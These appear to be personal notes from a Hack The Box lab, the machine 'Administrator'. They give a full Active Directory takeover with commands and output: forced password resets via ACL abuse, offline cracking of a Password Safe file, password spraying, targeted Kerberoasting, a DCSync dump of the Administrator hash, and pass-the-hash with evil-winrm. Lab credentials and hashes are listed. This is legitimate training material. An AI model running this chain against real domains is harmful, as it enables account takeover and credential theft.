## IP/Name
### Initial access
Port scan
```
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-09-22 20:27:24Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65052/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65057/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
65062/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65073/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65084/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65117/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 46758/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 55515/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 45402/udp): CLEAN (Failed to receive data)
|   Check 4 (port 18831/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-09-22T20:28:26
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6h58m30s

```
subdomain scan
dirscan
filescan


### Lateral Movement
Run bloodhound-py
```
bloodhound-python -u 'Olivia' -p 'ichliebedich' -d 'administrator.htb' -dc 'DC.administrator.htb' -ns 10.129.43.195  -c All --zip 
```

![[Assets/Pasted image 20260922205104.png]]

We change micheal pass using bloodyad
```
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ echo "10.129.43.195 administrator.htb DC.administrator.htb" | sudo tee -a /etc/hosts
[sudo] password for kali: 
10.129.43.195 administrator.htb DC.administrator.htb


┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ bloodyad -d administrator.htb -u 'Olivia' -p 'ichliebedich' --host "10.129.43.195" set password "michael" "anh1234" 
[+] Password changed successfully!
```
Michael have `ForceChangePassword` in benjamin

![[Assets/Pasted image 20260922210855.png]]
Run bloodyad
```
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ bloodyad -d administrator.htb -u 'michael' -p 'anh1234' --host "10.129.43.195" set password "benjamin" "anh1234" 
[+] Password changed successfully!
```
Now we can access ftp using benjamin
```
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ ftp 10.129.43.195
Connected to 10.129.43.195.
220 Microsoft FTP Service
Name (10.129.43.195:kali): benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||59293|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> mget *
mget Backup.psafe3 [anpqy?]? y
229 Entering Extended Passive Mode (|||59295|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|   952        3.92 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (3.91 KiB/s)

```

Crack password
```
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ pwsafe2john Backup.psafe3 > hash.txt
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ john  --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2026-09-22 10:20) 8.333g/s 136533p/s 136533c/s 136533C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
Read password
```
passafe Backup.psafe3

```

```
UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
UXLCI5iETUsIBoFVTj8yQFKoHjXmb
WwANQWnmJnGV07WQN8bMS7FMAbjNur
```


Spray password
```
SMB         10.129.43.195   445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 

```
Run evilwinrm
```
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ evil-winrm -i  10.129.43.195 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> ls
*Evil-WinRM* PS C:\Users\emily\Documents> cd ..
*Evil-WinRM* PS C:\Users\emily> tree /f /a

```
 Abusing `Generic write` of user ethan
 ```bash
 ┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ bloodyad -d administrator.htb -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --host "10.129.43.195" set object ethan servicePrincipalName -v 'Service/FakeSPN' 
[+] ethan's servicePrincipalName has been updated
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ faketime "$(ntpdate -q 10.129.43.195 | cut -d ' ' -f 1,2)" impacket-GetUserSPNs administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.129.43.195 -request -outputfile kerberos1.hash 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  -----  --------  --------------------------  ---------  ----------
Service/FakeSPN       ethan            2024-10-12 16:52:14.117811  <never>               


 
 sudo hashcat -m 13100 kerberos1.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 
 
 
 $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$a27adc8fd8d39fbac90fefad0b65d6d8$d6360d78030fdf62c2698eeaedbf0da96cf9a2f5e718750c02c1bfdb1f9b0578c2474651e4fd365225ed81ee2002166b265f049b5063b5b1d2a80a894c8d8d7ca97b9c81266d08f66e619fbd9b183ab8d9fe6129b25eca9936c1bd3bf5bd08bb4e53165c3c190707256c9be158aee3677ed2127b50c26f2d300d369cab0232de9fa82950d198e1fcbf4710af357fb79d7dba814bc432e48ee4cda350109fa80a558ebbdbd2be0b14467103f044b17ed23c1a4e0292692b04dfb6b88b169482ba745a31101034ed8c09a83ace673805bc87e22229c4b7cc3e6262f841e1773b11f23a3a0b3694434017dbe7fcea9ec4e1b622ee510293db263232c93039abf470809dd5714787d1282b013f5f024e72a9c8216d271cb5b7be7454ac322ce35180c5e30c89614fc3ed63e4c50acd3c7f23cd083031cd95d7d4f20277f3713309cb991428c6e1d5edf8df9fb6c757e3f430b78edaf28ce0e38256f8b584cb9c19e0153d57df084ec75be99d9b55fca84d305e853300d2ea5961222840b052e9012638e51925f47bc4720cdec0888f5c379bb084c9f80f4bc84454d65cb50825f957e7139bcddb4ef91a3c28f9bbf7efe3085b5c07d5a05cb071713b427b6f0c4c6415b67000fe62c13010b9bc7efd5527439d14d00dd2bfbedfb0a0163b02e49e5087e9b7854697a997335a49614a71f598638e7b62b67ce45431dc383a5b9f1dd9579e24a13a0cade2aa5ab7c1077f219d49b727a337a2e93d7731b19d45643076d4e431f493caee30b4f4ff5573573c4765ea006bcd9137c1f8f00cb346569940b7abe5e3ac9e88f0b0a6f9ca5eb1c56a5b1871bb58efcc36db33d56371ebc48cfb8b7019bc54f6b90641e35eaf813044b9e92b4b9ed6a566ed2e68531f95f143885f0424777a68767f0f56a7f591317d27cd1ccdfe5aac002f7365f799a9d656eaf724b809aa21006e04b645f19bb2a0c3008475e105ef5edf93abe5b6f78680818327ad59e8484626f25c319636a5956b1f8a10531174bf2c25827bb5d2b23c280081267d5727583513a52983cb1008c7d931b5ca17e484fe71e94154a5093bb9cef98b192c3a30ed29df0fc9014229f1cd30fb66a4bf24a6babc7c0db465a074e5b59d3f31dffe8a854f6c35ad9d75cb599f3e03a4c6ea4f787394dacedb707960c44d5ff2896c3386f6669e134114bd116e21dde2783fe19e9650c7b14b000e981d8d495378e8333c929dd42a43b030820c60bb5c64c250c018a511c3fb7b8a0fd59e68b7158b23ccc0b734ae4625ba2a817d1fa051e773f3f3a7835bafeaafc712249fb4efdb65bdf993c193a24bdd9c9dc8dae785cb1af5ac7dd617f7f83e5ff99e338e34f496868ddfc70790ad58a5d26009abdad651f4f6aa4d4b0cf68e72dbbbfff09e69ae6803aaa24bfcedf6355328bec5ad997c631af5fec4ade2a7f7500742e02cb4a87b3df97f27e72443559563509a07e6cbf784672703d98ee219e4b4e65d3f60f21ceab6ca6e124b332f57c684de824898d5d961be2425:limpbizkit
 
 ```


### Priv escalation


![[Assets/Pasted image 20260922215616.png]]
Perform dcsync and get administrator hash
```
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ impacket-secretsdump administrator.htb/ethan:'limpbizkit'@10.129.43.195 -just-dc-user Administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
[*] Cleaning up...
```

```
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ evil-winrm -i  10.129.43.195   -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> tree /f /a
Folder PATH listing
Volume serial number is 6131-DE70
C:.
+---3D Objects
+---Contacts
+---Desktop
|       root.txt
|
+---Documents
+---Downloads
+---Favorites
|   |   Bing.url
|   |
|   \---Links
+---Links
|       Desktop.lnk
|       Downloads.lnk
|
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos

```

| Username | pass                          | Hash |
| -------- | ----------------------------- | ---- |
| Olivia   | ichliebedich                  |      |
| michael  | anh1234                       |      |
| benjamin | anh1234                       |      |
| emily    | UXLCI5iETUsIBoFVTj8yQFKoHjXmb |      |
| ethan    | limpbizkit                    |      |
|          |                               |      |
